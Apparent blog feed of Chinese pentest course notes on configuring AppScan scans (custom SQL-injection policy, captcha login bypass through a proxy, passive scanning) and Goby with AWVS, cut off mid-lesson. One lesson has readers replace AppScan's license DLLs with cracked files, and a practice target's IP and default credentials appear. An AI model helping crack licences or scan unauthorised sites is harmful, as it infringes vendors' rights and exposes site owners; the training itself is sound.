src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4812c10f2bd445d6ac3d63e3caae12f8.png" alt="image.png"></p><p>3.基于模板报告</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/d7bbb31bea304c5086c93f66a8e4bbda.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-5-jie-zi-ding-yi-sao-miao-ce-lue-sao-miao-zhen-dui-xing-lou-dong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-5-jie-zi-ding-yi-sao-miao-ce-lue-sao-miao-zhen-dui-xing-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="第五节-AppScan自定义扫描策略，扫描针对性漏洞"><a href="#第五节-AppScan自定义扫描策略，扫描针对性漏洞" class="headerlink" title="第五节-AppScan自定义扫描策略，扫描针对性漏洞"></a>第五节-AppScan自定义扫描策略，扫描针对性漏洞</h1><p>安全扫描往往速度是很慢的，有些场景下他的扫描项目又不是我们需要的，这时候就需要定制专属的扫描策略了。本节课以sql注入漏洞为例</p><p>1.选择【扫描web应用程序】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/2e5a3c50f05f46879fac8a82573bd283.png" alt="image.png"></p><p>2.点击【取消】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c18d316f818b4febb9be9624370583c3.png" alt="image.png"></p><p>3.点击【配置】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/8b3ac7c8fb804ecabcd04b20606236f1.png" alt="image.png"></p><p>4.输入被目标网站url</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6acf7962b56b40cdae8e59cbdfd2b83d.png" alt="image.png"></p><p>5.选择【参数和cookie】，选择【定制头】，点击【+】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/0025b2e972fb46f594c42f356e17cadb.png" alt="image.png"></p><p>4.切换火狐浏览器，复制网站cookie</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/ed966b809eb140b4842fd846b623c2cb.png" alt="image.png"></p><p>5.切换到AppScan，填写定制头，点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6b9c37b2f38744c499373f48b7c7466e.png" alt="image.png"></p><p>6.点击【测试策略】，选择【缺省值】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/cda5ef11493848ee9431d497e693fff5.png" alt="image.png"></p><p>7.将所有的选中状态去掉</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/832603718ecc4424a80ee7907253d79f.png" alt="image.png"></p><p>8.搜索sql注入</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/71eed16ff0ce4cd69ad97e6815d5e36b.png" alt="image.png"></p><p>9.展开全选该漏洞的pload</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c6ffc56796ae4b5f8c78e70633b7b55b.png" alt="image.png"></p><p>10.点击【应用】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/c17d8474fb044dcfa9fc2f32e5bf5ceb.png" alt="image.png"></p><p>11.点击【导出】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/e2071bd37d6641aa92c003bfb570f143.png" alt="image.png"></p><p>12.选择喜欢的位置保存</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/b75c613fc42b48f6a80ba270be667ae2.png" alt="image.png"></p><p>13.点击【导入】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/a75ab821e297455989669f00ae32795f.png" alt="image.png"></p><p>14.选则需要的自定义策略</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/6026d155a3164ec396ca75796f63432c.png" alt="image.png"></p><p>15.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/fa0211647f8c4fe3be38710e2de6b8be.png" alt="image.png"></p><p>16.点击【手动扫描】，选择【AppScan Chromium 浏览器】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/f2167c67d48b4feb989384b52ab805fb.png" alt="image.png"></p><p>17.选则要探索的页面，然后点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/24f2de24301b4d92a9d3cbeebfb9bd97.png" alt="image.png"></p><p>18.点击【确定】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/1609886d3eae47f29af655201b45d55a.png" alt="image.png"></p><p>19.等待加载完成</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/9cf3cea101ae41c4b2e9262d58988b1e.png" alt="image.png"></p><p>20.点击【扫描】，选择【仅测试】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/8b9305d524584c41b7257845bc43e999.png" alt="image.png"></p><p>21.等待测试结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/cc5a78f3e4a34902a888da3f4785e63c.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640667392000/eb7431b64b194406a0548243f877c9f9.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-4-jie-rao-guo-deng-lu-yan-zheng-ma-shen-ru-sao-miao/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-4-jie-rao-guo-deng-lu-yan-zheng-ma-shen-ru-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="第四节-绕过登录验证码深入扫描"><a href="#第四节-绕过登录验证码深入扫描" class="headerlink" title="第四节-绕过登录验证码深入扫描"></a>第四节-绕过登录验证码深入扫描</h1><p>我们工作中最长碰到的工作场景是网站采用https协议，这时我们要用appScan进行扫描时，就需要先安装证书</p><h2 id="1-证书安装"><a href="#1-证书安装" class="headerlink" title="1.证书安装"></a>1.证书安装</h2><p>1.新建一个文件，点击【文件】，点击【新建】</p><p><img src="/images/c2cfd88d4b714cdab43af4c8e7cdb06d.png" alt="image.png"></p><p>2.选择【扫描web应用程序】</p><p><img src="/images/c2c466aa8c474c8285cfedea2cd4e819.png" alt="image.png"></p><p>3.点击【取消】</p><p><img src="/images/4bdc797b5c1a4b0db90df2164600a0ce.png" alt="image.png"></p><p>4.点击【手动扫描】，选择【外部设备】</p><p><img src="/images/cab4a5ef42054822941f0831e9498498.png" alt="image.png"></p><p>5.记录代理端口</p><p><img src="/images/3d64ba27c5084853a0a3dbdfff736651.png" alt="image.png"></p><p>6.点击【记录代理配置】</p><p><img src="/images/704f20425aa2482fa6bfdacf166f7c19.png" alt="image.png"></p><p>7.点击【记录代理】,点击【导出】</p><p><img src="/images/646d91731ece4fce965495fb0af02830.png" alt="image.png"></p><p>8.选择喜欢的位置，点击【保存】</p><p><img src="/images/19cc1e3e724a4d01b63b8a62fa8b6437.png" alt="image.png"></p><p>9.点击【取消】</p><p><img src="/images/4429279212ee445bada658d51e2081ae.png" alt="image.png"></p><p>10.解压已经保存的证书</p><p><img src="/images/fb6f8a02302f49c7979a7d3911228e9b.png" alt="image.png"></p><p>11.切换到火狐浏览器，点击【更多】，点击【设置】</p><p><img src="/images/183fa51ed27a4fb9a29bf53145876b97.png" alt="image.png"></p><p>12.输入证书，点击【回车】，点击【查看证书】</p><p><img src="/images/72039d699ea14ed59b691f2f3bdbb9eb.png" alt="image.png"></p><p>13.点击【证书颁发机构】，点击【导入】</p><p><img src="/images/640bf9059f674c2eae885b39eca32392.png" alt="image.png"></p><p>14.选择证书，点击【打开】</p><p><img src="/images/0eb3191f0ec845bc86bbc171ecc0f45c.png" alt="image.png"></p><p>15.勾选信任证书，点击【确定】</p><p><img src="/images/ff7fb370aec84bf7bb00d407e92ae443.png" alt="image.png"></p><p>16.点击【确定】</p><p><img src="/images/d782b58bd4e14794aad272ebf192947a.png" alt="image.png"></p><h2 id="2-手工探测绕过登录"><a href="#2-手工探测绕过登录" class="headerlink" title="2.手工探测绕过登录"></a>2.手工探测绕过登录</h2><p>扫描过程会遇到网站 存在 手机验证码，图形验证码，滑动验证等等，这时候想要深度扫描时，就需要进行登录绕过。有两种方法可以选择</p><p>第一：使用第三节课介绍的定制头解决</p><p>第二：使用手工探索-外置设备进行登录绕过，我们今天讲解第二种</p><p>1.新建一个文件，点击【文件】，点击【新建】</p><p><img src="/images/c2cfd88d4b714cdab43af4c8e7cdb06d.png" alt="image.png"></p><p>2.选择【扫描web应用程序】</p><p><img src="/images/c2c466aa8c474c8285cfedea2cd4e819.png" alt="image.png"></p><p>3.输入被测网址，点击【下一步】</p><p><img src="/images/df15f4f11ddc4368a9f2225e6e52b131.png" alt="image.png"></p><p>4.点击【记录】,点击【AppScan Chromium 浏览器】</p><p><img src="/images/655fdfe74d934406ada64b9800aafe91.png" alt="image.png"></p><p>5.进行登录</p><p><img src="/images/ebf536ebb6e44530b40a28df07d0784f.png" alt="image.png"></p><p>6.点击【我已登录到站点】</p><p><img src="/images/128a98bf975040cba4ffb2204623e16a.png" alt="image.png"></p><p><img src="/images/3a5c95f334bc40df86c1db022798bfba.png" alt="image.png"></p><p><img src="/images/dceb8d324cc04ac1bed635a6f4d34d62.png" alt="image.png"></p><p>可以看到，登录回放是失败，遇到这种情况，我们今天使用手工探索-外置设备进行登录绕过</p><p>7.点击【关闭】</p><p><img src="/images/873586ce76cd43cb925bc6cc216f9569.png" alt="image.png"></p><p>8.点击【取消】</p><p><img src="/images/14cc3447348f44ed89a023bf07863d5c.png" alt="image.png"></p><p>9.点击【取消】</p><p><img src="/images/9ea29ca3ecbb4f3387d2efd2187b002b.png" alt="image.png"></p><p>10.点击【手动扫描】，选择【外部设备】</p><p><img src="/images/cab4a5ef42054822941f0831e9498498.png" alt="image.png"></p><p>11.记录代理端口</p><p><img src="/images/02cc9d867b9d4ae4b4cceb505a271d18.png" alt="image.png"></p><p>12.切到火狐浏览器，进入被测网站，登录</p><p><img src="/images/c26acb3fb5c4422b86274cf8d2c256e9.png" alt="image.png"></p><p>13.点击【代理】，点击【选项】</p><p><img src="/images/a6a9e71178ae40a29a238b632a87cfc0.png" alt="image.png"></p><p>14.点击【编辑】</p><p><img src="/images/9a8cf830b95a4d93899a0a64672f691c.png" alt="image.png"></p><p>15.输入AppScan的端口,点击【保存】</p><p><img src="/images/883d17b276b24cec95950f80d64e7642.png" alt="image.png"></p><p>16.切换到被测网站，点击【代理】，选择【appscan】</p><p><img src="/images/c89091852abb4fc5b6f7a6f06fa594ef.png" alt="image.png"></p><p>17.点击想要测试功能</p><p><img src="/images/63d15e0c22fc40b99974ef30daa4f687.png" alt="image.png"></p><p><img src="/images/2723ab0161b7436aa7cb9f8c903789a0.png" alt="image.png"></p><p>18.点击【停止记录】</p><p><img src="/images/3b26cf2705b04f98bfc8e3abedd75003.png" alt="image.png"></p><p>19.选择被测网站，点击【确定】</p><p><img src="/images/d8a705be72e0435e963f93efe07c4fa7.png" alt="image.png"></p><p>20.等待流量加载完成</p><p><img src="/images/030b485295774299b3b5c71da4e1d48b.png" alt="image.png"></p><p>21.点击【扫描】，点击【仅测试】</p><p><img src="/images/ad65b72debe443fdb80dcbe019654dcf.png" alt="image.png"></p><p>22.等待测试结果</p><p><img src="/images/e9c9f52f51bb4138b66f3a0524f14311.png" alt="image.png"></p><p><img src="/images/8330ddbad423477a8f66206c6c07bf1c.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-3-jie-appscan-bei-dong-shou-dong-tan-suo-sao-miao/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-3-jie-appscan-bei-dong-shou-dong-tan-suo-sao-miao/</url>
      
        <content type="html"><![CDATA[<h1 id="第三节-AppScan被动手动探索扫描"><a href="#第三节-AppScan被动手动探索扫描" class="headerlink" title="第三节-AppScan被动手动探索扫描"></a>第三节-AppScan被动手动探索扫描</h1><p>被动式扫描：浏览器代理到AppScan，然后进行手工操作，探索产生出的流量给AppScan进行扫描。</p><p>他的优点是：扫描足够精准，覆盖率更加高，减少不必要的干扰包等等</p><h2 id="1-扫描基础准备"><a href="#1-扫描基础准备" class="headerlink" title="1.扫描基础准备"></a>1.扫描基础准备</h2><h3 id="1-火狐安装FoxyProxy"><a href="#1-火狐安装FoxyProxy" class="headerlink" title="1.火狐安装FoxyProxy"></a>1.火狐安装FoxyProxy</h3><p>1.打开扩展和主题</p><pre class="line-numbers language-none"><code class="language-none">about:addons<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.输入FoxyProxy 点击【回车】搜索</p><p><img src="/images/image-20211220101102542.png" alt="image-20211220101102542"></p><p>3.点击 【FoxyProxy Standard】</p><p><img src="/images/image-20211220101117058.png" alt="image-20211220101117058"></p><p>4.点击【添加到 Firefox】</p><p><img src="/images/image-20211220101133106.png" alt="image-20211220101133106"></p><h3 id="2-马士兵靶场"><a href="#2-马士兵靶场" class="headerlink" title="2.马士兵靶场"></a>2.马士兵靶场</h3><p>1.进入靶场</p><pre class="line-numbers language-none"><code class="language-none">https://www.bafangwy.com/battle<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2.启动dvwa靶场</p><p><img src="/images/image-20211220101210330.png" alt="image-20211220101210330"></p><p><img src="/images/image-20211220101218208.png" alt="image-20211220101218208"></p><p>3.访问靶场</p><pre class="line-numbers language-none"><code class="language-none">http://39.101.162.123:64936/login.phpadminpassword<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4.设置安全等级为low</p><p><img src="/images/image-20211220101245688.png" alt="image-20211220101245688"></p><p><img src="/images/image-20211220101251950.png" alt="image-20211220101251950"></p><h2 id="2-扫描步骤"><a href="#2-扫描步骤" class="headerlink" title="2.扫描步骤"></a>2.扫描步骤</h2><h3 id="1选择【扫描】–【手动探索】–【外部设备】"><a href="#1选择【扫描】–【手动探索】–【外部设备】" class="headerlink" title="1选择【扫描】–【手动探索】–【外部设备】"></a>1选择【扫描】–【手动探索】–【外部设备】</h3><p><img src="/images/image-20211220101317215.png" alt="image-20211220101317215"></p><p><img src="/images/image-20211220101326318.png" alt="image-20211220101326318"></p><h3 id="2-火狐浏览器点击【代理】–选择【选项】"><a href="#2-火狐浏览器点击【代理】–选择【选项】" class="headerlink" title="2.火狐浏览器点击【代理】–选择【选项】"></a>2.火狐浏览器点击【代理】–选择【选项】</h3><p><img src="/images/image-20211220101344037.png" alt="image-20211220101344037"></p><h3 id="3-点击【添加】"><a href="#3-点击【添加】" class="headerlink" title="3.点击【添加】"></a>3.点击【添加】</h3><p><img src="/images/image-20211220101355972.png" alt="image-20211220101355972"></p><h3 id="4-输入标题【appsacn】，添加ip【127-0-0-1】，添加端口【49729】，点击保存"><a href="#4-输入标题【appsacn】，添加ip【127-0-0-1】，添加端口【49729】，点击保存" class="headerlink" title="4.输入标题【appsacn】，添加ip【127.0.0.1】，添加端口【49729】，点击保存"></a>4.输入标题【appsacn】，添加ip【127.0.0.1】，添加端口【49729】，点击保存</h3><p><img src="/images/image-20211220101409923.png" alt="image-20211220101409923"></p><p><img src="/images/image-20211220101417072.png" alt="image-20211220101417072"></p><h3 id="5-开启代理"><a href="#5-开启代理" class="headerlink" title="5.开启代理"></a>5.开启代理</h3><p><img src="/images/image-20211220101432626.png" alt="image-20211220101432626"></p><h3 id="6-操作被测网站"><a href="#6-操作被测网站" class="headerlink" title="6.操作被测网站"></a>6.操作被测网站</h3><p><img src="/images/image-20211220101444737.png" alt="image-20211220101444737"></p><h3 id="7-切换到appScan-点击【停止记录】"><a href="#7-切换到appScan-点击【停止记录】" class="headerlink" title="7.切换到appScan 点击【停止记录】"></a>7.切换到appScan 点击【停止记录】</h3><p><img src="/images/image-20211220101456598.png" alt="image-20211220101456598"></p><h3 id="8-选择网站，点击【确定】"><a href="#8-选择网站，点击【确定】" class="headerlink" title="8.选择网站，点击【确定】"></a>8.选择网站，点击【确定】</h3><p><img src="/images/image-20211220101508810.png" alt="image-20211220101508810"></p><p><img src="/images/image-20211220101515856.png" alt="image-20211220101515856"></p><h3 id="9-点击【扫描】，选择【仅测试】"><a href="#9-点击【扫描】，选择【仅测试】" class="headerlink" title="9.点击【扫描】，选择【仅测试】"></a>9.点击【扫描】，选择【仅测试】</h3><p><img src="/images/image-20211220101534029.png" alt="image-20211220101534029"></p><h3 id="10-点击【是】"><a href="#10-点击【是】" class="headerlink" title="10.点击【是】"></a>10.点击【是】</h3><p><img src="/images/image-20211220101544955.png" alt="image-20211220101544955"></p><h3 id="11-选则储存位置，点击保存"><a href="#11-选则储存位置，点击保存" class="headerlink" title="11.选则储存位置，点击保存"></a>11.选则储存位置，点击保存</h3><p><img src="/images/image-20211220101556686.png" alt="image-20211220101556686"></p><h3 id="12-等待测试结果"><a href="#12-等待测试结果" class="headerlink" title="12.等待测试结果"></a>12.等待测试结果</h3><p><img src="/images/image-20211220101609909.png" alt="image-20211220101609909"></p><p><img src="/images/image-20211220101617427.png" alt="image-20211220101617427"></p><h2 id="3-appscan内置浏览器扫描"><a href="#3-appscan内置浏览器扫描" class="headerlink" title="3.appscan内置浏览器扫描"></a>3.appscan内置浏览器扫描</h2><h3 id="1-点击【手动探索】，选则【AppScan-Chromium-浏览器】"><a href="#1-点击【手动探索】，选则【AppScan-Chromium-浏览器】" class="headerlink" title="1.点击【手动探索】，选则【AppScan Chromium 浏览器】"></a>1.点击【手动探索】，选则【AppScan Chromium 浏览器】</h3><p><img src="/images/image-20211220101630427.png" alt="image-20211220101630427"></p><h3 id="2-点击【是】"><a href="#2-点击【是】" class="headerlink" title="2.点击【是】"></a>2.点击【是】</h3><p><img src="/images/image-20211220101650772.png" alt="image-20211220101650772"></p><h3 id="3-输入URL-点击【确定】"><a href="#3-输入URL-点击【确定】" class="headerlink" title="3.输入URL 点击【确定】"></a>3.输入URL 点击【确定】</h3><p><img src="/images/image-20211220101703074.png" alt="image-20211220101703074"></p><h3 id="4-点击取消"><a href="#4-点击取消" class="headerlink" title="4.点击取消"></a>4.点击取消</h3><p><img src="/images/image-20211220101715529.png" alt="image-20211220101715529"></p><h3 id="5-点击【配置】–【参数和cookie】–【定制头】"><a href="#5-点击【配置】–【参数和cookie】–【定制头】" class="headerlink" title="5.点击【配置】–【参数和cookie】–【定制头】"></a>5.点击【配置】–【参数和cookie】–【定制头】</h3><p><img src="/images/image-20211220101727775.png" alt="image-20211220101727775"></p><h3 id="6-在火狐浏览器复制cookie"><a href="#6-在火狐浏览器复制cookie" class="headerlink" title="6.在火狐浏览器复制cookie"></a>6.在火狐浏览器复制cookie</h3><p><img src="/images/image-20211220101740026.png" alt="image-20211220101740026"></p><h3 id="7-切换到AppScan，点击【-】，添加cookie，点击【确定】"><a href="#7-切换到AppScan，点击【-】，添加cookie，点击【确定】" class="headerlink" title="7.切换到AppScan，点击【+】，添加cookie，点击【确定】"></a>7.切换到AppScan，点击【+】，添加cookie，点击【确定】</h3><p><img src="/images/image-20211220101752959.png" alt="image-20211220101752959"></p><h3 id="8-点击确定"><a href="#8-点击确定" class="headerlink" title="8.点击确定"></a>8.点击确定</h3><p><img src="/images/image-20211220101803601.png" alt="image-20211220101803601"></p><h3 id="9-点击【手动探索】，选则【AppScan-Chromium-浏览器】"><a href="#9-点击【手动探索】，选则【AppScan-Chromium-浏览器】" class="headerlink" title="9.点击【手动探索】，选则【AppScan Chromium 浏览器】"></a>9.点击【手动探索】，选则【AppScan Chromium 浏览器】</h3><p><img src="/images/image-20211220101815512.png" alt="image-20211220101815512"></p><h3 id="10-进行手工探索，完成后，点击【确定】"><a href="#10-进行手工探索，完成后，点击【确定】" class="headerlink" title="10.进行手工探索，完成后，点击【确定】"></a>10.进行手工探索，完成后，点击【确定】</h3><p><img src="/images/image-20211220101829329.png" alt="image-20211220101829329"></p><p><img src="/images/image-20211220101836928.png" alt="image-20211220101836928"></p><h3 id="11-点击【确定】"><a href="#11-点击【确定】" class="headerlink" title="11.点击【确定】"></a>11.点击【确定】</h3><p><img src="/images/image-20211220101848039.png" alt="image-20211220101848039"></p><p><img src="/images/image-20211220101854695.png" alt="image-20211220101854695"></p><h3 id="12-点击【扫描】–【仅测试】"><a href="#12-点击【扫描】–【仅测试】" class="headerlink" title="12.点击【扫描】–【仅测试】"></a>12.点击【扫描】–【仅测试】</h3><p><img src="/images/image-20211220101906463.png" alt="image-20211220101906463"></p><p>13.点击【是】</p><p><img src="/images/image-20211220101916451.png" alt="image-20211220101916451"></p><h3 id="14-选择保存位置，点击【保存】"><a href="#14-选择保存位置，点击【保存】" class="headerlink" title="14.选择保存位置，点击【保存】"></a>14.选择保存位置，点击【保存】</h3><p><img src="/images/image-20211220101929768.png" alt="image-20211220101929768"></p><h3 id="15-等待扫描结果"><a href="#15-等待扫描结果" class="headerlink" title="15.等待扫描结果"></a>15.等待扫描结果</h3><p><img src="/images/image-20211220101941766.png" alt="image-20211220101941766"></p><p><img src="/images/image-20211220101948472.png" alt="image-20211220101948472"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-1-jie-appscan-jie-shao-he-an-zhuang/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/23appscan-lou-dong-sao-miao/di-1-jie-appscan-jie-shao-he-an-zhuang/</url>
      
        <content type="html"><![CDATA[<h1 id="第一节-AppScan介绍和安装"><a href="#第一节-AppScan介绍和安装" class="headerlink" title="第一节-AppScan介绍和安装"></a>第一节-AppScan介绍和安装</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h2><p>Appscan 10中文版是是全新网络安全漏洞扫描软件，软件可以直接可以对OS命令、SSRF和XXE攻击等漏洞进行检测，使得漏洞检测更加容易，提高漏洞的扫描效率。软件同时支持动态、静态、互动分析三种不同的测试功能，可自动化扫描检测网络或者系统安全漏洞，并采用全新的爬虫技术，能够根据网站入口自动摸取网页链接进行安全扫描，提供了扫描、报告和修复建议等功能。</p><h2 id="2-功能特色"><a href="#2-功能特色" class="headerlink" title="2.功能特色"></a>2.功能特色</h2><p>　　1、动态分析（“黑盒扫描”）</p><p>　　这是主要方法，用于测试和评估运行时的应用程序响应。</p><p>　　2、静态分析（“白盒扫描”）【代码审计】</p><p>　　这是用于在完整 Web 页面上下文中分析 JavaScript 代码的独特技术。</p><p>　　3、交互分析（“glass box 扫描”）</p><p>　　动态测试引擎可与驻留在 Web 服务器本身上的专用 glass-box 代理程序交互，从而使软件能够比仅通过传统动态测试时识别更多问题并具有更高准确性。</p><p>　　4、软件的高级功能包括：</p><p>　　常规和法规一致性报告，并提供超过 40 个不同的开箱即用模板。</p><h2 id="3-扫描流程"><a href="#3-扫描流程" class="headerlink" title="3.扫描流程"></a>3.扫描流程</h2><p><img src="/images/image-20211201203930801.png" alt="image-20211201203930801"></p><p><img src="/images/image-20211201203950394.png" alt="image-20211201203950394"></p><h2 id="4-扫描方式"><a href="#4-扫描方式" class="headerlink" title="4.扫描方式"></a>4.扫描方式</h2><p>Static： 静态分析 （白盒扫描）   源码分析：支持（Taint analysis\pattern matching）</p><p>Dynamic： 动态分析 （黑盒扫描）</p><p>Hybrid：混合分析（黑，白）【知道源代码】</p><p>Run-Time： 运行时分析（玻璃盒）【不知道源代码】</p><p>Client-Side：客户端分析(Javascript)</p><h2 id="5-安装与破解"><a href="#5-安装与破解" class="headerlink" title="5.安装与破解"></a>5.安装与破解</h2><p>1.安装前需安装.NET Framework 4.7.2（已安装请忽略）</p><p>2.双击运行Appscan_Setup_1002.exe，选择安装语言，点击确定；</p><p><img src="/images/image-20211201204315728.png" alt="image-20211201204315728"></p><p>3.选择I accept，点击下一步；</p><p><img src="/images/image-20211201204336720.png" alt="image-20211201204336720"></p><p>4.更改安装目录，点击安装；（注意记录下这个目录后面破解需要用到）</p><p><img src="/images/image-20211201204403352.png" alt="image-20211201204403352"></p><p>5.等待安装直到完成；</p><p><img src="/images/image-20211201204422500.png" alt="image-20211201204422500"></p><p>6.将破解文件 AppScanSDK.dll 和 HclLicenseProvider.dll 拷贝到安装目录D:\Program Files (x86)\HCL\AppScan Standard下替换原来的文件</p><p><img src="/images/image-20211201204444993.png" alt="image-20211201204444993"></p><p><img src="/images/image-20211201204453175.png" alt="image-20211201204453175"></p><p>7.双击桌面图标运行AppScan；</p><p><img src="/images/image-20211201204517852.png" alt="image-20211201204517852"></p><p>8.安装成功</p><p><img src="/images/image-20211201204548270.png" alt="image-20211201204548270"></p><p><img src="/images/image-20211201204557166.png" alt="image-20211201204557166"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-5-jie-goby-awvs-lian-dong/"/>
      <url>/2022/12/25/shen-tou-ke-cheng-xue-xi/di-2-bu-fen-shen-tou-yu-fang-yu/22awvs-lou-dong-sao-miao/di-5-jie-goby-awvs-lian-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="第五节-Goby-AWVS-联动"><a href="#第五节-Goby-AWVS-联动" class="headerlink" title="第五节-Goby+AWVS 联动"></a>第五节-Goby+AWVS 联动</h1><h2 id="1-Goby简介"><a href="#1-Goby简介" class="headerlink" title="1.Goby简介"></a>1.Goby简介</h2><p>Goby是针对目标企业梳理最全面的工具，同构goby可以清晰的扫描出ip地址开放的端口，以及端口对应的服务，于此同事会根据开放的端口及应用进行实战化的测试，并不在乎他的中低危害漏洞，而更在乎的是它能直接getshell的漏洞。</p><p>AWVS这款工具大家应该都比较熟悉了，他是针对web的轻量级的漏洞扫描工具。也就是根据我们提供的被扫描地址，快速的扫描出其所有的漏洞，包含高中低及信息泄露等漏洞。</p><p>结合我们前面的介绍，大家想想，Goby探测出ip地址开放的所有服务及应用，然后直接丢给AWVS，那么AWVS是不是就可以直接进行扫描了，然后存在的网站存在的漏扫是不是一幕了然了，还需要我们去手动挖么，很显然了啊，这俩工具一联动，躺着收洞洞呗。</p><p>Goby 错误异常汇总</p><p><a href="https://cn.gobies.org/faq.html">https://cn.gobies.org/faq.html</a></p><h2 id="2-Goby安装"><a href="#2-Goby安装" class="headerlink" title="2.Goby安装"></a>2.Goby安装</h2><p>1.在附件中下载 goby-win-x64-1.9.320.zip</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/cae347217f2e4edb8f49885f9c31a6f2.png" alt="image.png"></p><p>2.解压到喜欢的位置</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/b25b706b644b4b54a1c5444d7773c6ff.png" alt="image.png"></p><p>3.解压目录找到Goby.exe 右键–管理员运行</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/7c563477fdff4c5a92a428fa38faba5f.png" alt="image.png"></p><p>4.点击【是】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/1c17dae4b2724ad9a4609c8209c568b0.png" alt="image.png"></p><p>5.点击【More】如图所示，点击【EN】，点击【CN】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/d1622b88bc2e43fd94bd7d394c2e6ba9.png" alt="image.png"></p><p>6.点击【扩展程序】，搜索【AWVS】，点击【下载】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/94e1952d4b714acd8b24bdc3b4c50976.png" alt="image.png"></p><p>7.点击【已下载】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/39fed8e90aeb463b8e99cbb721c626b0.png" alt="image.png"></p><p>8.点击【设置】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1642730130000/6faa54cf76814488b5cc2e8c83b41efb.png" alt="image.png"></p><p>9.切换到【AWVS】，点击【用户】，点击【Profile】</p><p><img 